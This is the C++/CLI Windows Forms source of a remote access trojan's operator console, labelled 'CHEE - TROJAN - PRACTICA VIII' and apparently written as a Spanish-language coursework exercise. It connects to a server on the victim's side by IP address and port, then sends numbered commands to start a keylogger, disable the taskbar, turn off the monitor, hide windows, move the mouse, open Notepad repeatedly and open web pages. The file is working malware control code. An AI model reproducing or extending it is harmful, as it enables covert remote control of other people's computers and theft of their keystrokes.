#include <WinSock2.h>
#include <ws2tcpip.h>
#include <WinSock.h>
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <msclr\marshal_cppstd.h>
#include "trojan2.h"
#include "Enter_A_Message.h"
#include "TimesRequest.h"

using System::Runtime::InteropServices::Marshal;

#pragma once

SOCKET connectedSocket;
WSADATA wsaData;

namespace Trojan2 {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for Form1
	/// </summary>
	public ref class Form1 : public System::Windows::Forms::Form
	{
	public:
		Form1(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~Form1()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::PictureBox^  Picture;
	protected: 
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::TextBox^  ServerIp;
	private: System::Windows::Forms::TextBox^  ServerPort;


	private: System::Windows::Forms::Button^  ConnectButton;
	private: System::Windows::Forms::Button^  DisconectionButton;
	private: System::Windows::Forms::Button^  WebPageButtom;
	private: System::Windows::Forms::Button^  MessageButtom;
	private: System::Windows::Forms::Button^  PlayButtom;
	private: System::Windows::Forms::Button^  CrazyMouseButtom;
	private: System::Windows::Forms::Button^  HideButtom;
	private: System::Windows::Forms::GroupBox^  groupBox1;
	private: System::Windows::Forms::Button^  NotePadButtom;
	private: System::Windows::Forms::Button^  KeyLoggerButtom;
	private: System::Windows::Forms::Button^  DisableButtom;
	private: System::Windows::Forms::Button^  TurnOffButtom;












	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(Form1::typeid));
			this->Picture = (gcnew System::Windows::Forms::PictureBox());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->ServerIp = (gcnew System::Windows::Forms::TextBox());
			this->ServerPort = (gcnew System::Windows::Forms::TextBox());
			this->ConnectButton = (gcnew System::Windows::Forms::Button());
			this->DisconectionButton = (gcnew System::Windows::Forms::Button());
			this->WebPageButtom = (gcnew System::Windows::Forms::Button());
			this->MessageButtom = (gcnew System::Windows::Forms::Button());
			this->PlayButtom = (gcnew System::Windows::Forms::Button());
			this->CrazyMouseButtom = (gcnew System::Windows::Forms::Button());
			this->HideButtom = (gcnew System::Windows::Forms::Button());
			this->groupBox1 = (gcnew System::Windows::Forms::GroupBox());
			this->NotePadButtom = (gcnew System::Windows::Forms::Button());
			this->KeyLoggerButtom = (gcnew System::Windows::Forms::Button());
			this->DisableButtom = (gcnew System::Windows::Forms::Button());
			this->TurnOffButtom = (gcnew System::Windows::Forms::Button());
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->Picture))->BeginInit();
			this->groupBox1->SuspendLayout();
			this->SuspendLayout();
			// 
			// Picture
			// 
			this->Picture->Image = (cli::safe_cast<System::Drawing::Image^  >(resources->GetObject(L"Picture.Image")));
			this->Picture->InitialImage = (cli::safe_cast<System::Drawing::Image^  >(resources->GetObject(L"Picture.InitialImage")));
			this->Picture->Location = System::Drawing::Point(1, 1);
			this->Picture->Name = L"Picture";
			this->Picture->Size = System::Drawing::Size(647, 262);
			this->Picture->TabIndex = 0;
			this->Picture->TabStop = false;
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Arial", 19.8F, static_cast<System::Drawing::FontStyle>(((System::Drawing::FontStyle::Bold | System::Drawing::FontStyle::Italic) 
				| System::Drawing::FontStyle::Underline)), System::Drawing::GraphicsUnit::Point, static_cast<System::Byte>(0)));
			this->label1->ForeColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(7)), static_cast<System::Int32>(static_cast<System::Byte>(98)), 
				static_cast<System::Int32>(static_cast<System::Byte>(101)));
			this->label1->Location = System::Drawing::Point(131, 277);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(319, 38);
			this->label1->TabIndex = 1;
			this->label1->Text = L"RATROJAN - CHEE";
			this->label1->Click += gcnew System::EventHandler(this, &Form1::label1_Click);
			// 
			// ServerIp
			// 
			this->ServerIp->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9, System::Drawing::FontStyle::Italic, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->ServerIp->Location = System::Drawing::Point(6, 21);
			this->ServerIp->Name = L"ServerIp";
			this->ServerIp->Size = System::Drawing::Size(154, 24);
			this->ServerIp->TabIndex = 2;
			this->ServerIp->Text = L"Ip del servidor";
			this->ServerIp->TextChanged += gcnew System::EventHandler(this, &Form1::textBox1_TextChanged);
			// 
			// ServerPort
			// 
			this->ServerPort->AllowDrop = true;
			this->ServerPort->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9, System::Drawing::FontStyle::Italic, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->ServerPort->Location = System::Drawing::Point(6, 56);
			this->ServerPort->Name = L"ServerPort";
			this->ServerPort->Size = System::Drawing::Size(78, 24);
			this->ServerPort->TabIndex = 3;
			this->ServerPort->Text = L"9876";
			this->ServerPort->UseWaitCursor = true;
			this->ServerPort->TextChanged += gcnew System::EventHandler(this, &Form1::textBox1_TextChanged_1);
			// 
			// ConnectButton
			// 
			this->ConnectButton->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->ConnectButton->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->ConnectButton->Location = System::Drawing::Point(12, 345);
			this->ConnectButton->Name = L"ConnectButton";
			this->ConnectButton->Size = System::Drawing::Size(110, 37);
			this->ConnectButton->TabIndex = 5;
			this->ConnectButton->Text = L"Conectar";
			this->ConnectButton->UseVisualStyleBackColor = false;
			this->ConnectButton->Click += gcnew System::EventHandler(this, &Form1::button1_Click);
			// 
			// DisconectionButton
			// 
			this->DisconectionButton->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->DisconectionButton->Enabled = false;
			this->DisconectionButton->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->DisconectionButton->Location = System::Drawing::Point(12, 388);
			this->DisconectionButton->Name = L"DisconectionButton";
			this->DisconectionButton->Size = System::Drawing::Size(110, 34);
			this->DisconectionButton->TabIndex = 6;
			this->DisconectionButton->Text = L"Desconectar";
			this->DisconectionButton->UseVisualStyleBackColor = false;
			this->DisconectionButton->Click += gcnew System::EventHandler(this, &Form1::button1_Click_1);
			// 
			// WebPageButtom
			// 
			this->WebPageButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->WebPageButtom->Enabled = false;
			this->WebPageButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->WebPageButtom->Location = System::Drawing::Point(12, 454);
			this->WebPageButtom->Name = L"WebPageButtom";
			this->WebPageButtom->Size = System::Drawing::Size(190, 34);
			this->WebPageButtom->TabIndex = 7;
			this->WebPageButtom->Text = L"Abrir Pag. Web";
			this->WebPageButtom->UseVisualStyleBackColor = false;
			this->WebPageButtom->Click += gcnew System::EventHandler(this, &Form1::button1_Click_2);
			// 
			// MessageButtom
			// 
			this->MessageButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->MessageButtom->Enabled = false;
			this->MessageButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->MessageButtom->Location = System::Drawing::Point(219, 454);
			this->MessageButtom->Name = L"MessageButtom";
			this->MessageButtom->Size = System::Drawing::Size(190, 34);
			this->MessageButtom->TabIndex = 8;
			this->MessageButtom->Text = L"Mostrar Mensaje";
			this->MessageButtom->UseVisualStyleBackColor = false;
			this->MessageButtom->Click += gcnew System::EventHandler(this, &Form1::button1_Click_3);
			// 
			// PlayButtom
			// 
			this->PlayButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->PlayButtom->Enabled = false;
			this->PlayButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->PlayButtom->Location = System::Drawing::Point(427, 454);
			this->PlayButtom->Name = L"PlayButtom";
			this->PlayButtom->Size = System::Drawing::Size(190, 34);
			this->PlayButtom->TabIndex = 9;
			this->PlayButtom->Text = L"Canción";
			this->PlayButtom->UseVisualStyleBackColor = false;
			// 
			// CrazyMouseButtom
			// 
			this->CrazyMouseButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->CrazyMouseButtom->Enabled = false;
			this->CrazyMouseButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->CrazyMouseButtom->Location = System::Drawing::Point(12, 494);
			this->CrazyMouseButtom->Name = L"CrazyMouseButtom";
			this->CrazyMouseButtom->Size = System::Drawing::Size(190, 34);
			this->CrazyMouseButtom->TabIndex = 10;
			this->CrazyMouseButtom->Text = L"Mover Ratón";
			this->CrazyMouseButtom->UseVisualStyleBackColor = false;
			this->CrazyMouseButtom->Click += gcnew System::EventHandler(this, &Form1::button1_Click_4);
			// 
			// HideButtom
			// 
			this->HideButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->HideButtom->Enabled = false;
			this->HideButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->HideButtom->Location = System::Drawing::Point(219, 494);
			this->HideButtom->Name = L"HideButtom";
			this->HideButtom->Size = System::Drawing::Size(190, 34);
			this->HideButtom->TabIndex = 11;
			this->HideButtom->Text = L"Ocultar Ventana";
			this->HideButtom->UseVisualStyleBackColor = false;
			this->HideButtom->Click += gcnew System::EventHandler(this, &Form1::HideButtom_Click);
			// 
			// groupBox1
			// 
			this->groupBox1->Controls->Add(this->ServerIp);
			this->groupBox1->Controls->Add(this->ServerPort);
			this->groupBox1->Location = System::Drawing::Point(139, 337);
			this->groupBox1->Name = L"groupBox1";
			this->groupBox1->Size = System::Drawing::Size(184, 96);
			this->groupBox1->TabIndex = 12;
			this->groupBox1->TabStop = false;
			this->groupBox1->Text = L"Ip y Puerto Servidor";
			this->groupBox1->Enter += gcnew System::EventHandler(this, &Form1::groupBox1_Enter);
			// 
			// NotePadButtom
			// 
			this->NotePadButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->NotePadButtom->Enabled = false;
			this->NotePadButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->NotePadButtom->Location = System::Drawing::Point(427, 494);
			this->NotePadButtom->Name = L"NotePadButtom";
			this->NotePadButtom->Size = System::Drawing::Size(190, 34);
			this->NotePadButtom->TabIndex = 13;
			this->NotePadButtom->Text = L"Abrir Notepad";
			this->NotePadButtom->UseVisualStyleBackColor = false;
			this->NotePadButtom->Click += gcnew System::EventHandler(this, &Form1::NotePadButtom_Click);
			// 
			// KeyLoggerButtom
			// 
			this->KeyLoggerButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->KeyLoggerButtom->Enabled = false;
			this->KeyLoggerButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->KeyLoggerButtom->Location = System::Drawing::Point(12, 534);
			this->KeyLoggerButtom->Name = L"KeyLoggerButtom";
			this->KeyLoggerButtom->Size = System::Drawing::Size(190, 34);
			this->KeyLoggerButtom->TabIndex = 14;
			this->KeyLoggerButtom->Text = L"KeyLogger";
			this->KeyLoggerButtom->UseVisualStyleBackColor = false;
			this->KeyLoggerButtom->Click += gcnew System::EventHandler(this, &Form1::button1_Click_5);
			// 
			// DisableButtom
			// 
			this->DisableButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->DisableButtom->Enabled = false;
			this->DisableButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->DisableButtom->Location = System::Drawing::Point(219, 534);
			this->DisableButtom->Name = L"DisableButtom";
			this->DisableButtom->Size = System::Drawing::Size(190, 34);
			this->DisableButtom->TabIndex = 15;
			this->DisableButtom->Text = L"Deshabilitar Barra Tareas";
			this->DisableButtom->UseVisualStyleBackColor = false;
			this->DisableButtom->Click += gcnew System::EventHandler(this, &Form1::DisableButtom_Click);
			// 
			// TurnOffButtom
			// 
			this->TurnOffButtom->BackColor = System::Drawing::SystemColors::ButtonFace;
			this->TurnOffButtom->Enabled = false;
			this->TurnOffButtom->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 10.2F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point, 
				static_cast<System::Byte>(0)));
			this->TurnOffButtom->Location = System::Drawing::Point(427, 534);
			this->TurnOffButtom->Name = L"TurnOffButtom";
			this->TurnOffButtom->Size = System::Drawing::Size(190, 34);
			this->TurnOffButtom->TabIndex = 16;
			this->TurnOffButtom->Text = L"Apagar Monitor\r\n";
			this->TurnOffButtom->UseVisualStyleBackColor = false;
			this->TurnOffButtom->Click += gcnew System::EventHandler(this, &Form1::TurnOffButtom_Click);
			// 
			// Form1
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(8, 16);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(629, 595);
			this->Controls->Add(this->TurnOffButtom);
			this->Controls->Add(this->DisableButtom);
			this->Controls->Add(this->KeyLoggerButtom);
			this->Controls->Add(this->NotePadButtom);
			this->Controls->Add(this->groupBox1);
			this->Controls->Add(this->HideButtom);
			this->Controls->Add(this->CrazyMouseButtom);
			this->Controls->Add(this->PlayButtom);
			this->Controls->Add(this->MessageButtom);
			this->Controls->Add(this->WebPageButtom);
			this->Controls->Add(this->DisconectionButton);
			this->Controls->Add(this->ConnectButton);
			this->Controls->Add(this->label1);
			this->Controls->Add(this->Picture);
			this->Name = L"Form1";
			this->Text = L"CHEE - TROJAN - PRACTICA VIII";
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->Picture))->EndInit();
			this->groupBox1->ResumeLayout(false);
			this->groupBox1->PerformLayout();
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void label1_Click(System::Object^  sender, System::EventArgs^  e) {
			 }
	private: System::Void textBox1_TextChanged(System::Object^  sender, System::EventArgs^  e) {
			 }
	private: System::Void textBox1_TextChanged_1(System::Object^  sender, System::EventArgs^  e) {
			 }
	private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		//Obtains Server Ip and Port to connect
		System::String^ sysStrServerIp = ServerIp->Text;
		std::string sServerIp = msclr::interop::marshal_as<std::string>(sysStrServerIp);

		System::String^ sysStrServerPort = ServerPort->Text;
		std::string sServerPort = msclr::interop::marshal_as<std::string>(sysStrServerPort);
		

		//IP and Port Validation
		int num, flag=true, counter=0;
		char* context = NULL;

		char * cServerIp = new char[sServerIp.length()+1];
		char * cServerPort = new char[sServerPort.length()+1];

		strcpy_s(cServerIp, strlen(cServerIp), sServerIp.c_str());
		strcpy_s(cServerPort, strlen(cServerPort), sServerPort.c_str());

		char* p = strtok_s(cServerIp,".",&context);

        while (p && flag ){
                num = atoi(p);

                if (num>=0 && num<=255 && (counter++<4))
				{
                        flag=1;
                        p=strtok_s(NULL,".", &context);
                }
                else
				{
                        flag=0;
                        break;
                }
        }

		if ((flag) && (counter!=4))
		{
			MessageBox::Show(L"No es una dirección IP válida");
		}
		else
		{
			bool error = false;

			for (int counter = 0; counter < sServerPort.length(); counter++)
			{
				if (!isdigit(cServerPort[counter]))
				{
					MessageBox::Show(L"No es un puerto válido. Introduzca un número de puerto");
					error = true;
					break;
				}
			}
			
			if (!error)
			{
				char message[1500];

				bool connectionResult = connect(sServerIp, sServerPort, connectedSocket, wsaData);

				if (connectionResult)
				{
					sprintf_s(message, "Connected to Ip: %s - Port: %s", sServerIp.c_str(), sServerPort.c_str());
					System::String^ sMessage = gcnew String (message);
					MessageBox::Show(sMessage);

					this->DisconectionButton->Enabled = true;
					this->ConnectButton->Enabled = false;
					this->WebPageButtom->Enabled = true;
					this->MessageButtom->Enabled = true;
					this->PlayButtom->Enabled = true;
					this->CrazyMouseButtom->Enabled = true;
					this->HideButtom->Enabled = true;
					this->NotePadButtom->Enabled = true;
					this->KeyLoggerButtom->Enabled = true;
					this->DisableButtom->Enabled = true;
					this->TurnOffButtom->Enabled = true;
				}
			}

		}

		//delete [] cServerIp;
	}
	private: System::Void label2_Click(System::Object^  sender, System::EventArgs^  e) 
	{
	}
	private: System::Void button1_Click_1(System::Object^  sender, System::EventArgs^  e) 
	{
		bool disconnectionResult = disconnect(connectedSocket, wsaData);

		if (disconnectionResult)
		{
			MessageBox::Show("Desconexión realizada con éxito");
			this->DisconectionButton->Enabled = false;
			this->ConnectButton->Enabled = true;
			this->WebPageButtom->Enabled = false;
			this->MessageButtom->Enabled = false;
			this->PlayButtom->Enabled = false;
			this->CrazyMouseButtom->Enabled = false;
			this->HideButtom->Enabled = false;
			this->NotePadButtom->Enabled = false;
			this->KeyLoggerButtom->Enabled = false;
			this->DisableButtom->Enabled = false;
			this->TurnOffButtom->Enabled = false;
		}
	}
	private: System::Void button1_Click_2(System::Object^  sender, System::EventArgs^  e) 
	{
		int option = 1;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}
	}
	private: System::Void button1_Click_3(System::Object^  sender, System::EventArgs^  e) 
	{
		Enter_A_Message ^ form = gcnew Enter_A_Message;

		if(form->ShowDialog( this ) == System::Windows::Forms::DialogResult::OK )
		{
			System::String^ sysStrMessage = form->MessageBox->Text;

			int option = 2;

			bool sendResult = send(connectedSocket, option, sysStrMessage);
		
			if (sendResult)
			{
				MessageBox::Show("Mensaje enviado con éxito");
			}

		}
		
	}
	private: System::Void button1_Click_4(System::Object^  sender, System::EventArgs^  e) 
	{
		 int option = 4;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}
	}
	private: System::Void HideButtom_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		int option = 5;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}	 
	}
	private: System::Void groupBox1_Enter(System::Object^  sender, System::EventArgs^  e) 
	{
	}
	private: System::Void NotePadButtom_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		TimesRequest ^ form = gcnew TimesRequest;

		if(form->ShowDialog( this ) == System::Windows::Forms::DialogResult::OK )
		{
			System::String^ sysStrTimes = form->Numeric->Text;

			int option = 6;

			bool sendResult = send(connectedSocket, option, sysStrTimes);
		
			if (sendResult)
			{
				MessageBox::Show("Mensaje enviado con éxito");
			}

		}

	}
	private: System::Void button1_Click_5(System::Object^  sender, System::EventArgs^  e) 
	{
		 int option = 7;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}	
	}
	private: System::Void DisableButtom_Click(System::Object^  sender, System::EventArgs^  e)
	{
		int option = 8;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}	
	}
	private: System::Void TurnOffButtom_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		int option = 9;

		bool sendResult = send(connectedSocket, option, " ");
		
		if (sendResult)
		{
			MessageBox::Show("Mensaje enviado con éxito");
		}
	}
};
}

